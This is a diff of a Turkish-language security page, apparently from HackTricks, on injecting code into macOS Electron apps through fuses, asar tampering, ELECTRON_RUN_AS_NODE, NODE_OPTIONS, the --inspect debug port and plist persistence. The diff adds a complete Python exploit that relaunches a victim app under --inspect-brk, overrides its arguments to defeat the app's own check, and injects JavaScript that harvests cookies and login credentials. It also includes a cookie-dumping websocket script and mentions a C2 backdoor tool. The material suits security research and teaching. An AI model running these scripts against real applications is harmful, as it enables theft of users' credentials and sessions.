@@ -9,15 +9,15 @@ Ve node'un belirtilen dosyanın dışında **başka kodlar çalıştırmak için
 
 ### Electron Füzeleri
 
-Bu teknikler bir sonraki bölümde tartışılacak, ancak son zamanlarda Electron birkaç **güvenlik bayrağı ekledi**. Bunlar [**Electron Füzeleri**](https://www.electronjs.org/docs/latest/tutorial/fuses) ve bunlar macOS'taki Electron uygulamalarının **rastgele kod yüklemesini** **önlemek için** kullanılanlardır:
+Bu teknikler bir sonraki bölümde tartışılacak, ancak son zamanlarda Electron birkaç **güvenlik bayrağı ekledi**. Bunlar [**Electron Füzeleri**](https://www.electronjs.org/docs/latest/tutorial/fuses) ve bunlar macOS'taki Electron uygulamalarının **rastgele kod yüklemesini önlemek için** kullanılanlardır:
 
-- **`RunAsNode`**: Devre dışı bırakıldığında, kod enjeksiyonu için **`ELECTRON_RUN_AS_NODE`** env değişkeninin kullanılmasını engeller.
-- **`EnableNodeCliInspectArguments`**: Devre dışı bırakıldığında, `--inspect`, `--inspect-brk` gibi parametreler dikkate alınmayacaktır. Bu şekilde kod enjeksiyonunu önler.
-- **`EnableEmbeddedAsarIntegrityValidation`**: Etkinleştirildiğinde, yüklenen **`asar`** **dosyası** macOS tarafından **doğrulanacaktır**. Bu şekilde bu dosyanın içeriğini değiştirerek **kod enjeksiyonunu** **önler**.
-- **`OnlyLoadAppFromAsar`**: Bu etkinleştirildiğinde, yüklemek için şu sırayı aramak yerine: **`app.asar`**, **`app`** ve son olarak **`default_app.asar`**. Sadece app.asar'yı kontrol edecek ve kullanacak, böylece **`embeddedAsarIntegrityValidation`** füzesi ile **birleştirildiğinde** **doğrulanmamış kodun yüklenmesi** **imkansız** hale gelecektir.
+- **`RunAsNode`**: Devre dışı bırakıldığında, kod enjekte etmek için **`ELECTRON_RUN_AS_NODE`** env değişkeninin kullanılmasını engeller.
+- **`EnableNodeCliInspectArguments`**: Devre dışı bırakıldığında, `--inspect`, `--inspect-brk` gibi parametreler dikkate alınmayacaktır. Bu şekilde kod enjekte etmenin önüne geçilir.
+- **`EnableEmbeddedAsarIntegrityValidation`**: Etkinleştirildiğinde, yüklenen **`asar`** **dosyası** macOS tarafından **doğrulanacaktır**. Bu şekilde bu dosyanın içeriğini değiştirerek **kod enjeksiyonunu** önler.
+- **`OnlyLoadAppFromAsar`**: Bu etkinleştirildiğinde, yüklemek için şu sırayı aramak yerine: **`app.asar`**, **`app`** ve en son **`default_app.asar`**. Sadece app.asar'ı kontrol edecek ve kullanacak, böylece **`embeddedAsarIntegrityValidation`** füzesi ile birleştirildiğinde **doğrulanmamış kodun yüklenmesi imkansız** hale gelir.
 - **`LoadBrowserProcessSpecificV8Snapshot`**: Etkinleştirildiğinde, tarayıcı süreci V8 anlık görüntüsü için `browser_v8_context_snapshot.bin` adlı dosyayı kullanır.
 
-Kod enjeksiyonunu önlemeyecek başka ilginç bir fuse ise:
+Kod enjeksiyonunu önlemeyecek başka ilginç bir füze:
 
 - **EnableCookieEncryption**: Etkinleştirildiğinde, disk üzerindeki çerez deposu OS düzeyinde kriptografi anahtarları kullanılarak şifrelenir.
 
@@ -46,15 +46,15 @@ In macOS applications this is typically in `application.app/Contents/Frameworks/
 grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
 Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
 ```
-Bu dosyayı [https://hexed.it/](https://hexed.it/) adresinde yükleyebilir ve önceki dizeyi arayabilirsiniz. Bu dizenin ardından, her bir sigortanın devre dışı mı yoksa etkin mi olduğunu gösteren ASCII'de "0" veya "1" sayısını görebilirsiniz. **Sigorta değerlerini değiştirmek için** hex kodunu (`0x30` `0` ve `0x31` `1`'dir) değiştirin.
+Bu dosyayı [https://hexed.it/](https://hexed.it/) adresinde yükleyebilir ve önceki dizeyi arayabilirsiniz. Bu dizeden sonra, her bir sigortanın devre dışı mı yoksa etkin mi olduğunu gösteren ASCII'de "0" veya "1" sayısını görebilirsiniz. **Sigorta değerlerini değiştirmek için** hex kodunu (`0x30` `0` ve `0x31` `1`'dir) değiştirin.
 
 <figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>
 
-Eğer bu baytları değiştirilmiş olarak bir uygulamanın **`Electron Framework`** ikili dosyasını **üst üste yazmaya** çalışırsanız, uygulama çalışmayacaktır.
+Eğer bu baytları değiştirilmiş **`Electron Framework` ikili dosyasını** bir uygulamanın içine **overwrite** etmeye çalışırsanız, uygulama çalışmayacaktır.
 
-## RCE, Electron Uygulamalarına Kod Ekleme
+## RCE Electron Uygulamalarına Kod Ekleme
 
-Bir Electron Uygulamasının kullandığı **harici JS/HTML dosyaları** olabilir, bu nedenle bir saldırgan, imzasının kontrol edilmeyeceği bu dosyalara kod enjekte edebilir ve uygulama bağlamında rastgele kod çalıştırabilir.
+Bir Electron Uygulamasının kullandığı **harici JS/HTML dosyaları** olabilir, bu nedenle bir saldırgan bu dosyalara kod enjekte edebilir ve uygulama bağlamında rastgele kod çalıştırabilir.
 
 > [!CAUTION]
 > Ancak, şu anda 2 sınırlama vardır:
@@ -62,9 +62,9 @@ Bir Electron Uygulamasının kullandığı **harici JS/HTML dosyaları** olabili
 > - Bir Uygulamayı değiştirmek için **`kTCCServiceSystemPolicyAppBundles`** izni **gerekir**, bu nedenle varsayılan olarak bu artık mümkün değildir.
 > - Derlenmiş **`asap`** dosyası genellikle **`embeddedAsarIntegrityValidation`** `ve` **`onlyLoadAppFromAsar`** sigortalarını `etkin` olarak içerir.
 >
-> Bu da bu saldırı yolunu daha karmaşık (veya imkansız) hale getirir.
+> Bu saldırı yolunu daha karmaşık (veya imkansız) hale getirir.
 
-**`kTCCServiceSystemPolicyAppBundles`** gereksinimini, uygulamayı başka bir dizine (örneğin **`/tmp`**) kopyalayarak, klasörü **`app.app/Contents`** olarak yeniden adlandırarak, **zararlı** kodunuzla **asar** dosyasını **değiştirerek**, tekrar **`app.app/Contents`** olarak adlandırarak ve çalıştırarak atlatmanın mümkün olduğunu unutmayın.
+**`kTCCServiceSystemPolicyAppBundles`** gereksinimini aşmanın mümkün olduğunu unutmayın; uygulamayı başka bir dizine (örneğin **`/tmp`**) kopyalayarak, klasörü **`app.app/Contents`**'ı **`app.app/NotCon`** olarak yeniden adlandırarak, **kötü niyetli** kodunuzla **asar** dosyasını **değiştirerek**, tekrar **`app.app/Contents`** olarak yeniden adlandırarak ve çalıştırarak bunu yapabilirsiniz.
 
 Asar dosyasından kodu çıkarmak için:
 ```bash
@@ -74,9 +74,9 @@ Ve değiştirdikten sonra tekrar paketleyin:
 ```bash
 npx asar pack app-decomp app-new.asar
 ```
-## RCE with `ELECTRON_RUN_AS_NODE` <a href="#electron_run_as_node" id="electron_run_as_node"></a>
+## RCE with ELECTRON_RUN_AS_NODE
 
-[**Belgeler**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node)'e göre, bu ortam değişkeni ayarlandığında, süreci normal bir Node.js süreci olarak başlatır.
+According to [**the docs**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node), bu ortam değişkeni ayarlandığında, süreci normal bir Node.js süreci olarak başlatır.
 ```bash
 # Run this
 ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
@@ -84,7 +84,7 @@ ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
 require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
 ```
 > [!CAUTION]
-> Eğer **`RunAsNode`** sigortası devre dışı bırakılırsa, env var **`ELECTRON_RUN_AS_NODE`** göz ardı edilecek ve bu çalışmayacaktır.
+> Eğer **`RunAsNode`** sigortası devre dışı bırakılırsa, env değişkeni **`ELECTRON_RUN_AS_NODE`** göz ardı edilecek ve bu çalışmayacaktır.
 
 ### Uygulama Plist'inden Enjeksiyon
 
@@ -123,7 +123,7 @@ require('child_process').execSync('/System/Applications/Calculator.app/Contents/
 NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
 ```
 > [!CAUTION]
-> Eğer sigorta **`EnableNodeOptionsEnvironmentVariable`** **devre dışı** bırakılmışsa, uygulama **NODE_OPTIONS** ortam değişkenini başlatıldığında **yoksayacaktır**, eğer ortam değişkeni **`ELECTRON_RUN_AS_NODE`** ayarlanmamışsa, bu da **devre dışı** bırakılmışsa **yoksayılacaktır**.
+> Eğer sigorta **`EnableNodeOptionsEnvironmentVariable`** **devre dışı** bırakılmışsa, uygulama **NODE_OPTIONS** ortam değişkenini başlatıldığında **yoksayacaktır**, eğer ortam değişkeni **`ELECTRON_RUN_AS_NODE`** ayarlanmadıysa, bu da sigorta **`RunAsNode`** devre dışı bırakılmışsa **yoksayılacaktır**.
 >
 > Eğer **`ELECTRON_RUN_AS_NODE`** ayarlamazsanız, **hata** ile karşılaşacaksınız: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`
 
@@ -147,19 +147,227 @@ Bu ortam değişkenini bir plist içinde kötüye kullanarak kalıcılığı sa�
 ```
 ## RCE ile inceleme
 
-According to [**this**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), eğer **`--inspect`**, **`--inspect-brk`** ve **`--remote-debugging-port`** gibi bayraklarla bir Electron uygulaması çalıştırırsanız, **bir debug portu açılacaktır** böylece ona bağlanabilirsiniz (örneğin `chrome://inspect` üzerinden Chrome'dan) ve **ona kod enjekte edebilir** veya hatta yeni süreçler başlatabilirsiniz.\
+According to [**this**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), if you execute an Electron application with flags such as **`--inspect`**, **`--inspect-brk`** and **`--remote-debugging-port`**, a **debug port will be open** so you can connect to it (for example from Chrome in `chrome://inspect`) and you will be able to **inject code on it** or even launch new processes.\
 For example:
 ```bash
 /Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
 # Connect to it using chrome://inspect and execute a calculator with:
 require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
 ```
-> [!CAUTION]
-> Eğer **`EnableNodeCliInspectArguments`** sigortası devre dışı bırakılmışsa, uygulama **node parametrelerini** (örneğin `--inspect`) başlatıldığında **göz ardı edecektir**, eğer ortam değişkeni **`ELECTRON_RUN_AS_NODE`** ayarlanmamışsa, bu da **göz ardı edilecektir** eğer sigorta **`RunAsNode`** devre dışı bırakılmışsa.
->
-> Ancak, **electron parametresi `--remote-debugging-port=9229`** kullanarak hala bazı bilgileri çalmak mümkündür, örneğin **geçmiş** (GET komutları ile) veya tarayıcının **çerezleri** (çünkü bunlar tarayıcı içinde **şifresi çözülmüş** durumdadır ve bunları verecek bir **json uç noktası** vardır).
+In [**bu blog yazısında**](https://hackerone.com/reports/1274695), bu hata ayıklama, başsız bir chrome'un **rastgele dosyaları rastgele konumlara indirmesi** için kötüye kullanılıyor.
 
-Bunu nasıl yapacağınızı [**burada**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) ve [**burada**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) öğrenebilirsiniz ve otomatik aracı [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) veya şöyle basit bir script kullanabilirsiniz:
+> [!TIP]
+> Eğer bir uygulama, `--inspect` gibi env değişkenlerinin veya parametrelerin ayarlanıp ayarlanmadığını kontrol etmenin kendi özel yoluna sahipse, `--inspect-brk` argümanını kullanarak bunu çalışma zamanında **bypass** etmeyi deneyebilirsiniz; bu, uygulamanın başında **çalışmayı durduracak** ve bir bypass gerçekleştirecektir (örneğin, mevcut sürecin argümanlarını veya env değişkenlerini geçersiz kılmak).
+
+Aşağıdaki, uygulamayı `--inspect-brk` parametresi ile izleyip çalıştırarak, sahip olduğu özel korumayı (parametreleri `--inspect-brk`'yi kaldıracak şekilde geçersiz kılmak) aşmanın mümkün olduğu bir istismardı ve ardından uygulamadan çerezleri ve kimlik bilgilerini dökmek için bir JS yükü enjekte edildi:
+```python
+import asyncio
+import websockets
+import json
+import requests
+import os
+import psutil
+from time import sleep
+
+INSPECT_URL = None
+CONT = 0
+CONTEXT_ID = None
+NAME = None
+UNIQUE_ID = None
+
+JS_PAYLOADS = """
+var { webContents } = require('electron');
+var fs = require('fs');
+
+var wc = webContents.getAllWebContents()[0]
+
+
+function writeToFile(filePath, content) {
+const data = typeof content === 'string' ? content : JSON.stringify(content, null, 2);
+
+fs.writeFile(filePath, data, (err) => {
+if (err) {
+console.error(`Error writing to file ${filePath}:`, err);
+} else {
+console.log(`File written successfully at ${filePath}`);
+}
+});
+}
+
+function get_cookies() {
+intervalIdCookies = setInterval(() => {
+console.log("Checking cookies...");
+wc.session.cookies.get({})
+.then((cookies) => {
+tokenCookie = cookies.find(cookie => cookie.name === "token");
+if (tokenCookie){
+writeToFile("/tmp/cookies.txt", cookies);
+clearInterval(intervalIdCookies);
+wc.executeJavaScript(`alert("Cookies stolen and written to /tmp/cookies.txt")`);
+}
+})
+}, 1000);
+}
+
+function get_creds() {
+in_location = false;
+intervalIdCreds = setInterval(() => {
+if (wc.mainFrame.url.includes("https://www.victim.com/account/login")) {
+in_location = true;
+console.log("Injecting creds logger...");
+wc.executeJavaScript(`
+(function() {
+email = document.getElementById('login_email_id');
+password = document.getElementById('login_password_id');
+if (password && email) {
+return email.value+":"+password.value;
+}
+})();
+`).then(result => {
+writeToFile("/tmp/victim_credentials.txt", result);
+})
+}
+else if (in_location) {
+wc.executeJavaScript(`alert("Creds stolen and written to /tmp/victim_credentials.txt")`);
+clearInterval(intervalIdCreds);
+}
+}, 10); // Check every 10ms
+setTimeout(() => clearInterval(intervalId), 20000); // Stop after 20 seconds
+}
+
+get_cookies();
+get_creds();
+console.log("Payloads injected");
+"""
+
+async def get_debugger_url():
+"""
+Fetch the local inspector's WebSocket URL from the JSON endpoint.
+Assumes there's exactly one debug target.
+"""
+global INSPECT_URL
+
+url = "http://127.0.0.1:9229/json"
+response = requests.get(url)
+data = response.json()
+if not data:
+raise RuntimeError("No debug targets found on port 9229.")
+# data[0] should contain an object with "webSocketDebuggerUrl"
+ws_url = data[0].get("webSocketDebuggerUrl")
+if not ws_url:
+raise RuntimeError("webSocketDebuggerUrl not found in inspector data.")
+INSPECT_URL = ws_url
+
+
+async def monitor_victim():
+print("Monitoring victim process...")
+found = False
+while not found:
+sleep(1)  # Check every second
+for process in psutil.process_iter(attrs=['pid', 'name']):
+try:
+# Check if the process name contains "victim"
+if process.info['name'] and 'victim' in process.info['name']:
+found = True
+print(f"Found victim process (PID: {process.info['pid']}). Terminating...")
+os.kill(process.info['pid'], 9)  # Force kill the process
+except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+# Handle processes that might have terminated or are inaccessible
+pass
+os.system("open /Applications/victim.app --args --inspect-brk")
+
+async def bypass_protections():
+global CONTEXT_ID, NAME, UNIQUE_ID
+print(f"Connecting to {INSPECT_URL} ...")
+
+async with websockets.connect(INSPECT_URL) as ws:
+data = await send_cmd(ws, "Runtime.enable", get_first=True)
+CONTEXT_ID = data["params"]["context"]["id"]
+NAME = data["params"]["context"]["name"]
+UNIQUE_ID = data["params"]["context"]["uniqueId"]
+
+sleep(1)
+
+await send_cmd(ws, "Debugger.enable", {"maxScriptsCacheSize": 10000000})
+
+await send_cmd(ws, "Profiler.enable")
+
+await send_cmd(ws, "Debugger.setBlackboxPatterns", {"patterns": ["/node_modules/|/browser_components/"], "skipAnonnymous": False})
+
+await send_cmd(ws, "Runtime.runIfWaitingForDebugger")
+
+await send_cmd(ws, "Runtime.executionContextCreated", get_first=False, params={"context": {"id": CONTEXT_ID, "origin": "", "name": NAME, "uniqueId": UNIQUE_ID, "auxData": {"isDefault": True}}})
+
+code_to_inject = """process['argv'] = ['/Applications/victim.app/Contents/MacOS/victim']"""
+await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression": code_to_inject, "uniqueContextId":UNIQUE_ID})
+print("Injected code to bypass protections")
+
+
+async def js_payloads():
+global CONT, CONTEXT_ID, NAME, UNIQUE_ID
+
+print(f"Connecting to {INSPECT_URL} ...")
+
+async with websockets.connect(INSPECT_URL) as ws:
+data = await send_cmd(ws, "Runtime.enable", get_first=True)
+CONTEXT_ID = data["params"]["context"]["id"]
+NAME = data["params"]["context"]["name"]
+UNIQUE_ID = data["params"]["context"]["uniqueId"]
+await send_cmd(ws, "Runtime.compileScript", get_first=False, params={"expression":JS_PAYLOADS,"sourceURL":"","persistScript":False,"executionContextId":1})
+await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression":JS_PAYLOADS,"objectGroup":"console","includeCommandLineAPI":True,"silent":False,"returnByValue":False,"generatePreview":True,"userGesture":False,"awaitPromise":False,"replMode":True,"allowUnsafeEvalBlockedByCSP":True,"uniqueContextId":UNIQUE_ID})
+
+
+
+async def main():
+await monitor_victim()
+sleep(3)
+await get_debugger_url()
+await bypass_protections()
+
+sleep(7)
+
+await js_payloads()
+
+
+
+async def send_cmd(ws, method, get_first=False, params={}):
+"""
+Send a command to the inspector and read until we get a response with matching "id".
+"""
+global CONT
+
+CONT += 1
+
+# Send the command
+await ws.send(json.dumps({"id": CONT, "method": method, "params": params}))
+sleep(0.4)
+
+# Read messages until we get our command result
+while True:
+response = await ws.recv()
+data = json.loads(response)
+
+# Print for debugging
+print(f"[{method} / {CONT}] ->", data)
+
+if get_first:
+return data
+
+# If this message is a response to our command (by matching "id"), break
+if data.get("id") == CONT:
+return data
+
+# Otherwise it's an event or unrelated message; keep reading
+
+if __name__ == "__main__":
+asyncio.run(main())
+```
+> [!CAUTION]
+> Eğer **`EnableNodeCliInspectArguments`** sigortası devre dışı bırakılmışsa, uygulama başlatıldığında **node parametrelerini** (örneğin `--inspect`) **göz ardı edecektir**, eğer ortam değişkeni **`ELECTRON_RUN_AS_NODE`** ayarlanmamışsa, bu da **göz ardı edilecektir** eğer sigorta **`RunAsNode`** devre dışı bırakılmışsa.
+>
+> Ancak, **electron parametresi `--remote-debugging-port=9229`** kullanarak hala bazı bilgileri çalabilirsiniz, örneğin **geçmiş** (GET komutları ile) veya tarayıcının **çerezleri** (çünkü bunlar tarayıcı içinde **şifresi çözülmüş** durumdadır ve bunları verecek bir **json uç noktası** vardır).
+
+Bunu nasıl yapacağınızı [**burada**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) ve [**burada**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) öğrenebilirsiniz ve otomatik aracı [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) veya basit bir script kullanabilirsiniz:
 ```python
 import websocket
 ws = websocket.WebSocket()
@@ -167,11 +375,9 @@ ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00",
 ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
 print(ws.recv()
 ```
-Bu [**blog yazısında**](https://hackerone.com/reports/1274695), bu hata ayıklama, başsız bir chrome'un **rastgele dosyaları rastgele konumlara indirmesi** için kötüye kullanılıyor.
+### Injection from the App Plist
 
-### Uygulama Plist'inden Enjeksiyon
-
-Bu ortam değişkenini bir plist'te kötüye kullanarak kalıcılığı sağlamak için bu anahtarları ekleyebilirsiniz:
+Bu env değişkenini bir plist içinde kötüye kullanarak kalıcılığı sağlamak için bu anahtarları ekleyebilirsiniz:
 ```xml
 <dict>
 <key>ProgramArguments</key>
@@ -193,11 +399,13 @@ Bu ortam değişkenini bir plist'te kötüye kullanarak kalıcılığı sağlama
 ## JS Dışı Kod Çalıştırma
 
 Önceki teknikler, **electron uygulamasının sürecinde JS kodu çalıştırmanıza** izin verecektir. Ancak, **çocuk süreçlerin ana uygulama ile aynı sandbox profilinde çalıştığını** ve **TCC izinlerini miras aldığını** unutmayın.\
-Bu nedenle, örneğin kameraya veya mikrofona erişmek için hakları istismar etmek istiyorsanız, sadece **süreçten başka bir ikili dosya çalıştırabilirsiniz**.
+Bu nedenle, örneğin kameraya veya mikrofona erişmek için hakları istismar etmek istiyorsanız, **süreçten başka bir ikili dosya çalıştırabilirsiniz**.
 
 ## Otomatik Enjeksiyon
 
-[**electroniz3r**](https://github.com/r3ggi/electroniz3r) aracı, **kurulu savunmasız electron uygulamalarını bulmak** ve bunlara kod enjekte etmek için kolayca kullanılabilir. Bu araç, **`--inspect`** tekniğini kullanmaya çalışacaktır:
+- [**electroniz3r**](https://github.com/r3ggi/electroniz3r)
+
+Araç [**electroniz3r**](https://github.com/r3ggi/electroniz3r), **kurulu savunmasız electron uygulamalarını bulmak** ve bunlara kod enjekte etmek için kolayca kullanılabilir. Bu araç, **`--inspect`** tekniğini kullanmaya çalışacaktır:
 
 Kendiniz derlemeniz gerekiyor ve bunu şu şekilde kullanabilirsiniz:
 ```bash
@@ -235,7 +443,12 @@ You can now kill the app using `kill -9 57739`
 The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
 Shell binding requested. Check `nc 127.0.0.1 12345`
 ```
-## Referanslar
+- [https://github.com/boku7/Loki](https://github.com/boku7/Loki)
+
+Loki, Electron uygulamalarını arka kapı ile ele geçirmek için uygulamaların JavaScript dosyalarını Loki Komut ve Kontrol JavaScript dosyaları ile değiştirmek üzere tasarlandı.
+
+
+## References
 
 - [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
 - [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
